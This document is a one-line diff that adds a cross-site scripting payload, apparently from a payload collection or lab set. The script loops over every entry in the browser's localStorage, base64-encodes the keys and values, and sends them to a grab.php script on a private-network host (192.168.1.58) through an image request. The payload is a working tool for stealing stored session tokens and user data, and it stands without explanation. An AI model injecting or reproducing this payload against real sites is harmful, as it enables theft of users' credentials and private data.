@@ -1,0 +1,1 @@
+<script>var v='| ';for(var i = 0; i < localStorage.length; i++){v=v.concat(localStorage.key(i),':',localStorage.getItem(localStorage.key(i)),' | ');}var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(v);</script>
